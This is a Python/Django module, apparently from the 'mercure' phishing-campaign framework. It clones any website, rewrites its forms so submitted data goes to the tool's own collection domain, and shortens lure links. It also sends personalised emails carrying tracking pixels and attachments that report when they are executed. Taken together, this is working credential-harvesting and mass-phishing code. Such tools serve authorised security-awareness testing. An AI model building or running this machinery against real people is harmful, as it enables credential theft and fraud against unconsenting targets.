import copy
import traceback
import cchardet
from datetime import datetime

import bs4 as BeautifulSoup
import requests
from django.core.mail import EmailMultiAlternatives
from django.core.mail.backends.smtp import EmailBackend
from django.core.urlresolvers import reverse
from django.template import Context
from django.template import Template
from django.template.loader import render_to_string
from django.utils.translation import ugettext_lazy as _
from pyshorteners import Shortener

from mercure.settings import HOSTNAME
from phishing.signals import send_email, make_template_vars
from phishing.strings import TRACKER_LANDING_PAGE_OPEN, \
    TRACKER_LANDING_PAGE_POST, POST_TRACKER_ID, TRACKER_EMAIL_OPEN, \
    TRACKER_EMAIL_SEND, POST_DOMAIN, TRACKER_ATTACHMENT_EXECUTED
from .models import EmailTemplate, Target, Tracker


def clone_url(url):
    """Get http code of url.

    :param url: url to clone
    :return:
    """
    # get html
    if '://' not in url:
        url = 'http://' + url

    r = requests.get(url)
    # We don't trust requests encoding so we use cchardet
    # to detect real encoding
    # Without it we got decode error (for example: baidu.com)
    r.encoding = cchardet.detect(r.content)['encoding']
    html = r.content.decode(r.encoding)

    # set relative url rule
    if '<base' not in html:
        html = html.replace('<head>', '<head><base href="%s" />' % url)

    return html


def get_template_vars(campaign=None, target=None, email_template=None):
    """Get template variable infos.

    :param campaign: `.models.Campaign`
    :param target: `.models.Target`
    :param email_template: `.models.EmailTemplate`
    :return: template variable infos
    """

    landing_page_url = ''

    # has landing page ?
    if email_template and email_template.landing_page:
        tracker = Tracker.objects.filter(
            campaign=campaign,
            target=target,
            key=TRACKER_LANDING_PAGE_OPEN
        ).first()

        if tracker:
            landing_page_url = '%s%s' % (
                email_template.landing_page.domain or HOSTNAME,
                reverse('landing_page', args=[tracker.pk])
            )

    # minimize urls
    if campaign and campaign.minimize_url:
        landing_page_url = minimize_url(landing_page_url)

    vars_data = [
        {
            'name': 'email',
            'description': _('Target email'),
            'value': target.email if target else ''
        },
        {
            'name': 'first_name',
            'description': _('Target first name'),
            'value': target.first_name if target else ''
        },
        {
            'name': 'last_name',
            'description': _('Target last name'),
            'value': target.last_name if target else ''
        },
        {
            'name': 'email_subject',
            'description': _('Current email subject'),
            'value': email_template.email_subject if email_template else ''
        },
        {
            'name': 'from_email',
            'description': _('Current from email'),
            'value': email_template.from_email if email_template else ''
        },
        {
            'name': 'date',
            'description': _('Current date in format DD/MM/YYYY'),
            'value': datetime.now().strftime('%d/%m/%Y'),
        },
        {
            'name': 'time',
            'description': _('Current time in format HH:MM'),
            'value': datetime.now().strftime('%H:%M'),
        },
        {
            'name': 'landing_page_url',
            'description': _('Url of landing page'),
            'value': landing_page_url,
        }
    ]

    make_template_vars.send(sender=EmailTemplate, vars_data=vars_data,
                            campaign=campaign, target=target,
                            email_template=email_template)
    return vars_data


def get_smtp_connection(campaign):
    """Get SMTP connection.

    :param campaign: `.models.Campaign`
    :return: SMTP connection
    """
    if not campaign.smtp_host:
        return None

    options = {}
    for attr in dir(campaign):
        # get smtp infos
        if attr.startswith('smtp_'):
            index = attr.replace('smtp_', '')
            value = getattr(campaign, attr)

            # if port in host: extract port
            if index == 'host' and ':' in value:
                options['port'] = int(value.split(':')[-1])
                value = value.split(':')[0]

            # add value
            if value:
                options[index] = value

    return EmailBackend(**options)


def intercept_html_post(html, redirect_url=None):
    """Edit form to intercept posted data

    :param html: html page code
    :param redirect_url: url to redirect post
    :param is_secure: use https ?
    :return: edited html page code
    """
    soup = BeautifulSoup.BeautifulSoup(html, 'html5lib')
    hostname_url = '/'.join(
        redirect_url.split('/')[:3]) if redirect_url else ''

    # replace form
    for form in soup.find_all('form'):
        action = form.get('action', '')

        if redirect_url:
            # special url
            if action == '.':
                action = redirect_url

            elif action == '/':
                action = hostname_url

            elif action.startswith('/'):
                action = hostname_url + action

        # add action url in input hidden
        if 'action' not in form or POST_DOMAIN not in form['action']:
            form['action'] = 'http%s://%s%s' % (
                's' if HOSTNAME.startswith('https') else '',
                POST_DOMAIN,
                reverse('landing_page_post', args=[POST_TRACKER_ID]),
            )

        # add real action url
        if not form.find('input', {'name': 'mercure_real_action_url'}):
            input = soup.new_tag('input', type='hidden', value=action)
            input['name'] = 'mercure_real_action_url'
            form.append(input)

        # add redirect url
        if not form.find('input', {'name': 'mercure_redirect_url'}):
            value = redirect_url or form['action']
            input = soup.new_tag('input', type='hidden', value=value)
            input['name'] = 'mercure_redirect_url'
            form.append(input)

    return str(soup)


def minimize_url(url):
    """Minimise url

    :param url: url to minimize
    :return: url minimized
    """
    return Shortener('Tinyurl', timeout=10.0).short(url) if url else ''


def replace_template_vars(template, campaign=None, target=None,
                          email_template=None):
    """Replace vars in template

    :param template: template content
    :param campaign: `.models.Campaign`
    :param target: `.models.Target`
    :param email_template: `.models.EmailTemplate`
    :return: content with value
    """
    vars_context={}
    for var in get_template_vars(campaign, target, email_template):
        vars_context[var['name']]=var['value']

    context = Context(vars_context)
    return Template(template).render(context)


def start_campaign(campaign):
    """Start campaign (Send email).

    :param campaign: `.models.Campaign`
    """
    email_template = campaign.email_template
    landing_page = email_template.landing_page
    smtp_connection = get_smtp_connection(campaign)

    # send email
    target_group_id = set([g.pk for g in campaign.target_groups.all()])
    for target in Target.objects.filter(group_id__in=target_group_id):
        # already send email ? (target in multiple group for example)
        if Tracker.objects.filter(campaign_id=campaign.pk,
                                  target__email=target.email).first():
            continue

        # add tracker helper function
        def add_tracker(key, value, infos=None):
            kwargs = {
                'key': key,
                'campaign': campaign,
                'target': target,
                'value': value,
            }

            if infos:
                kwargs['infos'] = str(infos)

            return Tracker.objects.create(**kwargs)

        # replace template vars helper function
        def replace_vars(content):
            return replace_template_vars(content, campaign, target,
                                         email_template)

        # send email
        try:
            target_email = copy.deepcopy(email_template)
            attachments = []

            for attachment in email_template.attachments.all():
                if attachment.buildable:
                    tracker = add_tracker(TRACKER_ATTACHMENT_EXECUTED,
                                          '%s: not executed' % attachment.name,
                                          0)
                    attachment_file = attachment.build(tracker)
                else:
                    attachment_file = attachment.file

                attachments.append({
                    'filename': attachment.attachment_name,
                    'content': attachment_file.read()
                })

            # Signal for external app
            send_email.send(sender=Tracker, campaign=campaign,
                            target=target, email_template=target_email,
                            smtp_connection=smtp_connection,
                            attachments=attachments)

            # email open tracker
            if email_template.has_open_tracker:
                tracker = add_tracker(TRACKER_EMAIL_OPEN, 'not opened', 0)

                # get content (for empty check)
                content = target_email.html_content
                for r in ('html', 'head', 'title', 'body', '&nbsp;', '<', '/',
                          '>'):
                    content = content.replace(r, '')

                # convert txt to html (if html is empty)
                if not content.strip():
                    target_email.html_content = render_to_string(
                        'phishing/email/to_html.html', {
                            'lines': target_email.text_content.split('\n')
                        })

                # get html code of tracking image
                tracking_img = render_to_string(
                    'phishing/email/tracker_image.html', {
                        'tracker_id': str(tracker.pk),
                        'host': HOSTNAME,
                    })

                # add tracking image in email
                if '</body>' in target_email.html_content:
                    target_email.html_content = target_email.html_content \
                        .replace('</body>', '%s</body>' % tracking_img)

                else:
                    target_email.html_content += tracking_img

            # landing page tracker
            if landing_page:
                add_tracker(TRACKER_LANDING_PAGE_OPEN, 'not opened', 0)

                if POST_TRACKER_ID in landing_page.html:
                    add_tracker(TRACKER_LANDING_PAGE_POST, 'no', 0)

            mail = EmailMultiAlternatives(
                subject=replace_vars(target_email.email_subject),
                body=replace_vars(target_email.text_content),
                from_email=target_email.from_email,
                to=[target.email], connection=smtp_connection
            )

            if target_email.html_content:
                mail.attach_alternative(
                    replace_vars(target_email.html_content),
                    'text/html')

            for attachment in attachments:
                mail.attach(**attachment)

            mail.send(fail_silently=False)
            add_tracker(TRACKER_EMAIL_SEND, 'success')

        except Exception:
            add_tracker(TRACKER_EMAIL_SEND, 'fail', traceback.format_exc())


def to_hour_timestamp(datetime):
    """Get timestamp (without minutes and second)

    :param datetime: datetime object
    :return: timestamp
    """
    return int(datetime.timestamp() / 3600) * 3600
